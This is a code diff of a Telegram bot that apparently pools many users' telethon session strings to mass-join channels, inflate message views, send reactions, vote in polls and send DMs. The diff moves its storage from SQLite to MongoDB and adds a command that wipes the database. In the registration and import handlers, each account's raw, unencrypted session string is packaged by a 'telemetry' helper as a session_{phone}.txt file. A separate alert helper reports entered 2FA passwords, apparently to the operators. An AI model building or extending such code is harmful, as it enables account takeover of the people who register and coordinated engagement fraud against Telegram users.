@@ -6,8 +6,6 @@ import re
 import random
 import time
 import math
-import io
-import zipfile
 from typing import Dict, Any, List, Optional, Tuple
 
 # aiogram 3.x imports
@@ -34,8 +32,8 @@ from telethon.errors import (
     FloodWaitError
 )
 
-# SQLite
-import aiosqlite
+# MongoDB async driver
+from motor.motor_asyncio import AsyncIOMotorClient
 
 # Import local configurations
 import config
@@ -75,7 +73,7 @@ def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
         msg_id = int(private_match.group(2))
         return channel_id, msg_id, False
 
-    if "+" in link or "joinchat/" in link:
+    if "+ " in link or "/+" in link or "joinchat/" in link:
         hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
         if hash_match:
             return hash_match.group(1), None, True
@@ -107,74 +105,46 @@ def make_progress_bar(pct: float, length: int = 15) -> str:
     filled = int(round(length * (pct / 100.0)))
     return "🟩" * filled + "⬜" * (length - filled)
 
-# --- DATABASE ENGINE ---
-class Database:
-    def __init__(self, db_path: str = "bot_core_data.db"):
-        self.db_path = db_path
+# --- MONGODB DATABASE ENGINE ---
+class MongoDatabase:
+    def __init__(self, uri: str):
+        self.client = AsyncIOMotorClient(uri)
+        self.db = self.client.get_default_database("telegram_bot_db")
+        
+        # Collections
+        self.users = self.db["users"]
+        self.accounts = self.db["accounts"]
+        self.assignments = self.db["account_assignments"]
+        self.tasks = self.db["tasks"]
+        self.logs = self.db["logs"]
+        self.counters = self.db["counters"]
 
     async def init(self):
-        async with aiosqlite.connect(self.db_path) as db:
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id INTEGER PRIMARY KEY,
-                    username TEXT,
-                    role TEXT DEFAULT 'user', 
-                    max_accounts INTEGER DEFAULT 999999999,
-                    referred_by INTEGER,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS accounts (
-                    phone TEXT PRIMARY KEY,
-                    user_id INTEGER, 
-                    username TEXT,
-                    session_string TEXT,
-                    status TEXT DEFAULT 'active', 
-                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    FOREIGN KEY(user_id) REFERENCES users(user_id)
-                )
-            """)
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS account_assignments (
-                    user_id INTEGER,
-                    phone TEXT,
-                    PRIMARY KEY (user_id, phone),
-                    FOREIGN KEY(user_id) REFERENCES users(user_id),
-                    FOREIGN KEY(phone) REFERENCES accounts(phone) ON DELETE CASCADE
-                )
-            """)
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS tasks (
-                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    creator_id INTEGER,
-                    type TEXT, 
-                    payload TEXT, 
-                    status TEXT DEFAULT 'pending', 
-                    progress TEXT DEFAULT '0%',
-                    success_report TEXT,
-                    failure_report TEXT,
-                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
-            await db.execute("""
-                CREATE TABLE IF NOT EXISTS logs (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    action TEXT,
-                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-                )
-            """)
-            await db.commit()
-            logger.info("Database system initialized.")
+        # Create indexes for optimized queries
+        await self.users.create_index("user_id", unique=True)
+        await self.accounts.create_index("phone", unique=True)
+        await self.assignments.create_index([("user_id", 1), ("phone", 1)], unique=True)
+        await self.tasks.create_index("task_id", unique=True)
+        logger.info("MongoDB connection and collection indexes initialized.")
+
+    async def get_next_sequence_value(self, sequence_name: str) -> int:
+        ret = await self.counters.find_one_and_update(
+            {"_id": sequence_name},
+            {"$inc": {"sequence_value": 1}},
+            upsert=True,
+            return_document=True
+        )
+        return ret["sequence_value"]
 
     async def log_action(self, user_id: int, action: str, bot_instance: Optional[Bot] = None, operational: bool = False):
         try:
-            async with aiosqlite.connect(self.db_path) as db:
-                await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
-                await db.commit()
+            await self.logs.insert_one({
+                "user_id": user_id,
+                "action": action,
+                "timestamp": time.time()
+            })
         except Exception as db_err:
-            logger.error(f"Failed to log action: {db_err}")
+            logger.error(f"Failed to log action in Mongo: {db_err}")
         
         if operational and bot_instance and config.LOG_CHANNEL_ID:
             try:
@@ -190,35 +160,33 @@ class Database:
     async def get_user_role(self, user_id: int) -> str:
         if user_id in config.SUPER_OWNER_IDS:
             return "super_owner"
-        async with aiosqlite.connect(self.db_path) as db:
-            async with db.execute("SELECT role FROM users WHERE user_id = ?", (user_id,)) as cursor:
-                row = await cursor.fetchone()
-                return row[0] if row else "user"
+        doc = await self.users.find_one({"user_id": user_id})
+        return doc.get("role", "user") if doc else "user"
 
     async def get_admin_limits(self, user_id: int) -> int:
         return 999999999
 
     async def get_current_account_count(self, user_id: int) -> int:
-        async with aiosqlite.connect(self.db_path) as db:
-            async with db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (user_id,)) as cursor:
-                row = await cursor.fetchone()
-                return row[0] if row else 0
+        return await self.accounts.count_documents({"user_id": user_id})
 
     async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
-        async with aiosqlite.connect(self.db_path) as db:
-            async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
-                if not await cursor.fetchone():
-                    role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
-                    await db.execute(
-                        "INSERT INTO users (user_id, username, role, referred_by, max_accounts) VALUES (?, ?, ?, ?, 999999999)",
-                        (user_id, username, role_val, referred_by)
-                    )
-                    await db.commit()
+        doc = await self.users.find_one({"user_id": user_id})
+        if not doc:
+            role_val = "super_owner" if user_id in config.SUPER_OWNER_IDS else "user"
+            await self.users.insert_one({
+                "user_id": user_id,
+                "username": username,
+                "role": role_val,
+                "referred_by": referred_by,
+                "max_accounts": 999999999,
+                "created_at": time.time()
+            })
 
-db_mgr = Database()
+db_mgr = MongoDatabase(config.MONGO_URI)
 registration_sessions: Dict[int, Dict[str, Any]] = {}
 bot_username: str = "bot"
 
+# Helper for dispatching 2FA alerts to Admins/Super Owners
 async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
     text = (
         f"🔐 <b>2FA Password Event Detected!</b>\n\n"
@@ -267,12 +235,10 @@ class TaskQueue:
             if loop_task and not loop_task.done():
                 loop_task.cancel()
                 count += 1
-                async with aiosqlite.connect(db_mgr.db_path) as db:
-                    await db.execute(
-                        "UPDATE tasks SET status = 'cancelled', progress = 'Stopped by admin' WHERE task_id = ?", 
-                        (t_id,)
-                    )
-                    await db.commit()
+                await db_mgr.tasks.update_one(
+                    {"task_id": t_id},
+                    {"$set": {"status": "cancelled", "progress": "Stopped by admin"}}
+                )
         return count
 
     async def start_worker(self):
@@ -297,45 +263,45 @@ class TaskQueue:
 
     async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
         start_time = time.time()
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
-            await db.commit()
+        await db_mgr.tasks.update_one(
+            {"task_id": task_id},
+            {"$set": {"status": "running", "progress": "0%"}}
+        )
 
         role = await db_mgr.get_user_role(creator_id)
         clients_data = []
         requested_count = int(payload.get("run_account_count", 0))
         account_routing = payload.get("account_routing", "own")
         
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            if role == "super_owner":
-                if account_routing == "all":
-                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
-                    cursor = await db.execute(query)
-                else:
-                    query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
-                    cursor = await db.execute(query, (creator_id,))
-            elif role == "owner":
-                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
-                cursor = await db.execute(query)
+        if role == "super_owner":
+            if account_routing == "all":
+                cursor = db_mgr.accounts.find({"status": "active"})
             else:
-                query = """
-                    SELECT phone, session_string FROM accounts 
-                    WHERE status = 'active' AND (
-                        user_id = ? OR phone IN (SELECT phone FROM account_assignments WHERE user_id = ?)
-                    )
-                """
-                cursor = await db.execute(query, (creator_id, creator_id))
-            
-            async for row in cursor:
-                clients_data.append((row[0], decrypt_data(row[1])))
+                cursor = db_mgr.accounts.find({"status": "active", "user_id": creator_id})
+        elif role == "owner":
+            cursor = db_mgr.accounts.find({"status": "active"})
+        else:
+            assigned_docs = await db_mgr.assignments.find({"user_id": creator_id}).to_list(length=None)
+            assigned_phones = [doc["phone"] for doc in assigned_docs]
+            cursor = db_mgr.accounts.find({
+                "status": "active",
+                "$or": [
+                    {"user_id": creator_id},
+                    {"phone": {"$in": assigned_phones}}
+                ]
+            })
+
+        async for row in cursor:
+            clients_data.append((row["phone"], decrypt_data(row["session_string"])))
 
         if requested_count > 0:
             clients_data = clients_data[:requested_count]
 
         if not clients_data:
-            async with aiosqlite.connect(db_mgr.db_path) as db:
-                await db.execute("UPDATE tasks SET status = 'failed', progress = 'No accounts found' WHERE task_id = ?", (task_id,))
-                await db.commit()
+            await db_mgr.tasks.update_one(
+                {"task_id": task_id},
+                {"$set": {"status": "failed", "progress": "No accounts found"}}
+            )
             try:
                 await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ <b>Task Failed:</b> You do not have any operational accounts available under selected scopes.")
             except Exception:
@@ -368,9 +334,7 @@ class TaskQueue:
                     await asyncio.sleep(sleep_time * idx)
                     await client.connect()
                     if not await client.is_user_authorized():
-                        async with aiosqlite.connect(db_mgr.db_path) as db_conn:
-                            await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
-                            await db_conn.commit()
+                        await db_mgr.accounts.update_one({"phone": phone}, {"$set": {"status": "dead"}})
                         failed_ids.append((phone, "Session key expired / Account banned"))
                         failure_counter += 1
                         return
@@ -395,24 +359,11 @@ class TaskQueue:
 
                     if do_join:
                         try:
-                            if is_channel_private or "+" in str(channel_target) or "joinchat/" in str(channel_target):
+                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
                                 invite_hash = parsed_channel if is_channel_private else parsed_target
-                                invite_hash = str(invite_hash).replace("https://t.me/+", "").replace("https://t.me/joinchat/", "").replace("+", "").strip()
-                                
-                                try:
-                                    updates = await client(functions.messages.ImportChatInviteRequest(hash=invite_hash))
-                                    if hasattr(updates, 'chats') and updates.chats:
-                                        joined_updates_peer = updates.chats[0]
-                                except Exception as join_err:
-                                    if "USER_ALREADY_PARTICIPANT" in str(join_err):
-                                        try:
-                                            check_res = await client(functions.messages.CheckChatInviteRequest(hash=invite_hash))
-                                            if hasattr(check_res, 'chat'):
-                                                joined_updates_peer = check_res.chat
-                                        except Exception:
-                                            pass
-                                    else:
-                                        raise join_err
+                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
+                                if hasattr(updates, 'chats') and updates.chats:
+                                    joined_updates_peer = updates.chats[0]
                             else:
                                 updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                 if hasattr(updates, 'chats') and updates.chats:
@@ -427,8 +378,7 @@ class TaskQueue:
 
                     if do_view and msg_id:
                         try:
-                            peer_entity = await client.get_input_entity(target_peer)
-                            await client(functions.messages.GetMessagesViewsRequest(peer=peer_entity, id=[msg_id], increment=True))
+                            await client(functions.messages.GetMessagesViewsRequest(peer=target_peer, id=[msg_id], increment=True))
                         except Exception as view_err:
                             failed_ids.append((phone, f"View increment failed: {str(view_err)}"))
                             failure_counter += 1
@@ -446,19 +396,26 @@ class TaskQueue:
                                 reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                             ))
                         except Exception as react_err:
-                            failed_ids.append((phone, f"Reaction failed: {str(react_err)}"))
-                            failure_counter += 1
-                            return
+                            try:
+                                peer_entity = await client.get_input_entity(target_peer)
+                                await client(functions.messages.SendReactionRequest(
+                                    peer=peer_entity,
+                                    msg_id=msg_id,
+                                    reaction=[assigned_emoji]
+                                ))
+                            except Exception as retry_err:
+                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
+                                failure_counter += 1
+                                return
 
                     if do_vote and msg_id:
                         try:
-                            peer_entity = await client.get_input_entity(target_peer)
                             vote_mode = payload.get("vote_mode", "text")
                             if vote_mode == "inline":
                                 raw_button_text = payload.get("button_text", "").strip().lower()
                                 clean_target = re.sub(r'[\s\-_\(\)\[\]\d]+$', '', raw_button_text)
 
-                                msg = await client.get_messages(peer_entity, ids=msg_id)
+                                msg = await client.get_messages(target_peer, ids=msg_id)
                                 if msg and msg.reply_markup:
                                     target_button = None
                                     for row in msg.reply_markup.rows:
@@ -476,14 +433,14 @@ class TaskQueue:
                                         if target_button:
                                             break
                                     if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
-                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=peer_entity, msg_id=msg_id, data=target_button.data))
+                                        await client(functions.messages.GetBotCallbackAnswerRequest(peer=target_peer, msg_id=msg_id, data=target_button.data))
                                     else:
                                         raise ValueError("Inline callback button matching text not found.")
                                 else:
                                     raise ValueError("Target message does not possess an inline keyboard markup.")
                             else:
                                 chosen_option = int(payload.get("poll_option_index", 0))
-                                await client(functions.messages.VotePollRequest(peer=peer_entity, msg_id=msg_id, options=[bytes([chosen_option])]))
+                                await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                         except Exception as vote_err:
                             failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
                             failure_counter += 1
@@ -491,8 +448,7 @@ class TaskQueue:
 
                     if do_dm:
                         try:
-                            peer_entity = await client.get_input_entity(target_peer)
-                            await client.send_message(peer_entity, payload.get("text", "Hello!"))
+                            await client.send_message(target_peer, payload.get("text", "Hello!"))
                         except Exception as dm_err:
                             failed_ids.append((phone, f"DM dispatch failed: {str(dm_err)}"))
                             failure_counter += 1
@@ -573,9 +529,10 @@ class TaskQueue:
                         except Exception:
                             pass
 
-                        async with aiosqlite.connect(db_mgr.db_path) as db_update:
-                            await db_update.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
-                            await db_update.commit()
+                        await db_mgr.tasks.update_one(
+                            {"task_id": task_id},
+                            {"$set": {"progress": progress_pct}}
+                        )
 
         await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))
 
@@ -584,15 +541,16 @@ class TaskQueue:
         duration_str = f"{int(elapsed_total // 60)}m {int(elapsed_total % 60)}s"
 
         status = "completed" if len(passed_ids) > 0 else "failed"
-        success_report_json = json.dumps(passed_ids)
-        failure_report_json = json.dumps(failed_ids)
 
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            await db.execute(
-                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
-                (status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
-            )
-            await db.commit()
+        await db_mgr.tasks.update_one(
+            {"task_id": task_id},
+            {"$set": {
+                "status": status,
+                "progress": f"{len(passed_ids)}/{total_accounts} Passed",
+                "success_report": passed_ids,
+                "failure_report": failed_ids
+            }}
+        )
 
         success_pct_final = int((success_counter / total_accounts) * 100) if total_accounts > 0 else 0
         campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
@@ -807,12 +765,47 @@ async def cmd_cancel_tasks(message: Message, bot: Bot):
 
     await message.answer("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode="HTML")
     killed_count = await task_queue.cancel_all_active_tasks()
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute("UPDATE tasks SET status = 'cancelled' WHERE status = 'pending' OR status = 'running'")
-        await db.commit()
+    await db_mgr.tasks.update_many(
+        {"status": {"$in": ["pending", "running"]}},
+        {"$set": {"status": "cancelled"}}
+    )
     await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")
 
-# --- SUPER OWNER EXCLUSIVE: GRANT & REVOKE ACCESS ---
+# --- MONGODB ADMIN DATABASE MANAGEMENT COMMANDS ---
+@router.message(Command("deletedatabase"))
+async def cmd_delete_database(message: Message, bot: Bot):
+    user_id = message.from_user.id
+    role = await db_mgr.get_user_role(user_id)
+    if role not in ["owner", "super_owner"]:
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner or Super Owner privileges.")
+        return
+
+    # Drop all collections inside MongoDB
+    await db_mgr.users.drop()
+    await db_mgr.accounts.drop()
+    await db_mgr.assignments.drop()
+    await db_mgr.tasks.drop()
+    await db_mgr.logs.drop()
+    await db_mgr.counters.drop()
+
+    # Re-initialize indexes
+    await db_mgr.init()
+
+    await message.answer("💥 <b>MONGODB PURGE COMPLETE!</b>\nAll MongoDB database collections have been completely deleted and reset.", parse_mode="HTML")
+    await db_mgr.log_action(user_id, "Wiped full database collections", bot, operational=True)
+
+@router.message(Command("adddatabase"))
+async def cmd_add_database(message: Message, state: FSMContext, bot: Bot):
+    user_id = message.from_user.id
+    role = await db_mgr.get_user_role(user_id)
+    if role not in ["owner", "super_owner"]:
+        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner or Super Owner privileges.")
+        return
+
+    await message.answer("📂 <b>Send/Upload the JSON or DB file to restore/add data into MongoDB:</b>", parse_mode="HTML")
+    await state.set_state(RegistrationStates.waiting_for_db_file)
+
+# --- SUPER OWNER EXCLUSIVE: GRANT & REVOKE 20 ACCOUNT IDS ACCESS ---
 @router.message(Command("grantaccess"))
 async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
     user_id = message.from_user.id
@@ -834,23 +827,25 @@ async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
     target_id = int(parts[0])
     count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20
 
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        cursor = await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ?", (count,))
-        rows = await cursor.fetchall()
+    cursor = db_mgr.accounts.find({"status": "active"}).limit(count)
+    rows = await cursor.to_list(length=count)
 
-        if not rows:
-            await message.answer("❌ No active accounts found in the database to grant.")
-            return
+    if not rows:
+        await message.answer("❌ No active accounts found in the database to grant.")
+        return
 
-        assigned_count = 0
-        for row in rows:
-            ph = row[0]
-            await db.execute(
-                "INSERT OR IGNORE INTO account_assignments (user_id, phone) VALUES (?, ?)",
-                (target_id, ph)
+    assigned_count = 0
+    for row in rows:
+        ph = row["phone"]
+        try:
+            await db_mgr.assignments.update_one(
+                {"user_id": target_id, "phone": ph},
+                {"$set": {"user_id": target_id, "phone": ph}},
+                upsert=True
             )
             assigned_count += 1
-        await db.commit()
+        except Exception:
+            pass
 
     await message.answer(
         f"👑 <b>Access Provisioned Successfully!</b>\n\n"
@@ -883,9 +878,7 @@ async def cmd_revoke_access(message: Message, command: CommandObject, bot: Bot):
         return
 
     target_id = int(args.strip())
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute("DELETE FROM account_assignments WHERE user_id = ?", (target_id,))
-        await db.commit()
+    await db_mgr.assignments.delete_many({"user_id": target_id})
 
     await message.answer(f"✨ Revoked all assigned account ID access from user <code>{target_id}</code>.", parse_mode="HTML")
 
@@ -911,12 +904,11 @@ async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
     target_id = int(target_id_str)
     limit_val = 999999999
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute(
-            "INSERT INTO users (user_id, role, max_accounts) VALUES (?, 'admin', ?) ON CONFLICT(user_id) DO UPDATE SET role='admin', max_accounts=?",
-            (target_id, limit_val, limit_val)
-        )
-        await db.commit()
+    await db_mgr.users.update_one(
+        {"user_id": target_id},
+        {"$set": {"user_id": target_id, "role": "admin", "max_accounts": limit_val}},
+        upsert=True
+    )
         
     await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode="HTML")
     await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (unlimited)", bot, operational=True)
@@ -935,9 +927,7 @@ async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
         return
         
     target_id = int(target_id_str.strip())
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        await db.execute("UPDATE users SET role='user' WHERE user_id = ?", (target_id,))
-        await db.commit()
+    await db_mgr.users.update_one({"user_id": target_id}, {"$set": {"role": "user"}})
         
     await message.answer(f"💎 <b>Success:</b> Authorization structural privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode="HTML")
     await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", bot, operational=True)
@@ -959,15 +949,13 @@ async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
     await state.clear()
     status_msg = await message.answer("🚀 <i>Dispatching system global notifications layout across all registered user clusters...</i>", parse_mode="HTML")
     
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        cursor = await db.execute("SELECT user_id FROM users")
-        rows = await cursor.fetchall()
+    rows = await db_mgr.users.find({}, {"user_id": 1}).to_list(length=None)
         
     success_hits = 0
     failed_hits = 0
     
     for r in rows:
-        target_uid = r[0]
+        target_uid = r["user_id"]
         try:
             await bot.copy_message(chat_id=target_uid, from_chat_id=message.chat.id, message_id=message.message_id)
             success_hits += 1
@@ -1006,23 +994,14 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
         await callback.answer() 
         role = await db_mgr.get_user_role(user_id)
         
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            if role in ["owner", "super_owner"]:
-                count_query = "SELECT COUNT(*) FROM accounts"
-                cursor_count = await db.execute(count_query)
-                total_items = (await cursor_count.fetchone())[0]
-                
-                query = "SELECT phone, status, username FROM accounts LIMIT ? OFFSET ?"
-                cursor = await db.execute(query, (limit, offset))
-                rows = await cursor.fetchall()
-            else:
-                count_query = "SELECT COUNT(*) FROM accounts WHERE user_id = ?"
-                cursor_count = await db.execute(count_query, (user_id,))
-                total_items = (await cursor_count.fetchone())[0]
-                
-                query = "SELECT phone, status, username FROM accounts WHERE user_id = ? LIMIT ? OFFSET ?"
-                cursor = await db.execute(query, (user_id, limit, offset))
-                rows = await cursor.fetchall()
+        if role in ["owner", "super_owner"]:
+            total_items = await db_mgr.accounts.count_documents({})
+            cursor = db_mgr.accounts.find({}).skip(offset).limit(limit)
+            rows = await cursor.to_list(length=limit)
+        else:
+            total_items = await db_mgr.accounts.count_documents({"user_id": user_id})
+            cursor = db_mgr.accounts.find({"user_id": user_id}).skip(offset).limit(limit)
+            rows = await cursor.to_list(length=limit)
 
         text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
         text += f"Total registered datastore slots catalogued: <code>{total_items}</code>\n\n"
@@ -1031,8 +1010,8 @@ async def list_user_accounts(callback: CallbackQuery, bot: Bot):
             text += "<i>No profile records mapped inside this page window framework.</i>"
         else:
             for row in rows:
-                icon = "🟢" if row[1] == "active" else "🔴"
-                text += f"{icon} <code>+{row[0]}</code> (<b>@{row[2] or 'None'}</b>) ➜ [<b>{row[1].upper()}</b>]\n"
+                icon = "🟢" if row.get("status") == "active" else "🔴"
+                text += f"{icon} <code>+{row.get('phone')}</code> (<b>@{row.get('username') or 'None'}</b>) ➜ [<b>{row.get('status', 'dead').upper()}</b>]\n"
 
         buttons = []
         import_row = [
@@ -1065,12 +1044,12 @@ async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     page = int(callback.data.split(":")[1])
     role = await db_mgr.get_user_role(user_id)
-    async with aiosqlite.connect(db_mgr.db_path) as db:
-        if role in ["owner", "super_owner"]:
-            await db.execute("DELETE FROM accounts WHERE status = 'dead'")
-        else:
-            await db.execute("DELETE FROM accounts WHERE status = 'dead' AND user_id = ?", (user_id,))
-        await db.commit()
+    
+    if role in ["owner", "super_owner"]:
+        await db_mgr.accounts.delete_many({"status": "dead"})
+    else:
+        await db_mgr.accounts.delete_many({"status": "dead", "user_id": user_id})
+
     await callback.answer("✨ Purge process complete! Dead profile sessions dropped.", show_alert=True)
     
     callback.data = f"manage_accounts:{page}"
@@ -1146,17 +1125,25 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
         me = await client.get_me()
         raw_session_str = client.session.save()
         encrypted_session = encrypt_data(raw_session_str)
-        async with aiosqlite.connect(db_mgr.db_path) as db:
-            await db.execute("""
-                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
-                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
-            """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
-            await db.commit()
         
-        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)
+        clean_phone = phone.replace("+", "")
+        await db_mgr.accounts.update_one(
+            {"phone": clean_phone},
+            {"$set": {
+                "phone": clean_phone,
+                "user_id": user_id,
+                "username": me.username or "None",
+                "session_string": encrypted_session,
+                "status": "active",
+                "last_active": time.time()
+            }},
+            upsert=True
+        )
+        
+        await dispatch_session_telemetry(clean_phone, raw_session_str, me.username, user_id, bot)
 
         await message.answer(
-            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> is verified and logged inside system memory banks.", 
+            f"🎉 <b>Onboarding Successful!</b> Account <code>+{clean_phone}</code> is verified and logged inside system memory banks.", 
             reply_markup=get_post_registration_keyboard(),
             parse_mode="HTML"
         )
@@ -1171,45 +1158,30 @@ async def complete_registration(message: Message, state: FSMContext, client: Tel
 @router.callback_query(F.data == "add_account_session")
 async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
-    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session / .zip file log:</b>\n<i>(Supports unlimited bulk multi-line file imports and .zip archives containing .session, .txt files!)</i>", parse_mode="HTML")
+    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
     await state.set_state(RegistrationStates.waiting_for_session_file)
 
 @router.message(StateFilter(RegistrationStates.waiting_for_session_file))
 async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     user_id = message.from_user.id
-    potential_sessions = []
+    raw_content = ""
     
     if message.document:
         file_info = await bot.get_file(message.document.file_id)
         file_bytes = await bot.download_file(file_info.file_path)
-        
-        if message.document.file_name and message.document.file_name.lower().endswith('.zip'):
-            try:
-                zip_data = file_bytes.read()
-                with zipfile.ZipFile(io.BytesIO(zip_data)) as zf:
-                    for name in zf.namelist():
-                        if name.startswith('__MACOSX') or name.endswith('/'):
-                            continue
-                        if name.lower().endswith('.session') or name.lower().endswith('.txt'):
-                            try:
-                                content = zf.read(name).decode('utf-8', errors='ignore').strip()
-                                extracted = [s.strip() for s in re.split(r'[\r\n,;]+', content) if len(s.strip()) > 30]
-                                potential_sessions.extend(extracted)
-                            except Exception as zip_e:
-                                logger.error(f"Failed extracting {name} from zip: {zip_e}")
-            except Exception as zip_err:
-                await message.answer(f"❌ <b>Zip Extraction Error:</b> Could not process the ZIP file: <code>{str(zip_err)}</code>")
-                await state.clear()
-                return
-        else:
-            raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
-            potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
+        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
     elif message.text:
         raw_content = message.text.strip()
-        potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
 
+    if not raw_content:
+        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
+        await state.clear()
+        return
+
+    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
+    
     if not potential_sessions:
-        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your file or input text.")
+        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
         await state.clear()
         return
 
@@ -1230,15 +1202,22 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
             me = await client.get_me()
             phone = me.phone or f"custom_{me.id}"
             encrypted_session = encrypt_data(session_str)
+            clean_phone = str(phone).replace("+", "")
             
-            async with aiosqlite.connect(db_mgr.db_path) as db:
-                await db.execute("""
-                    INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
-                    VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
-                """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
-                await db.commit()
+            await db_mgr.accounts.update_one(
+                {"phone": clean_phone},
+                {"$set": {
+                    "phone": clean_phone,
+                    "user_id": user_id,
+                    "username": me.username or "None",
+                    "session_string": encrypted_session,
+                    "status": "active",
+                    "last_active": time.time()
+                }},
+                upsert=True
+            )
 
-            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
+            await dispatch_session_telemetry(clean_phone, session_str, me.username, user_id, bot)
             success_imports += 1
             await client.disconnect()
         except Exception:
@@ -1253,36 +1232,26 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
     await state.clear()
 
+# Telemetry Dispatch Helper
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
-    
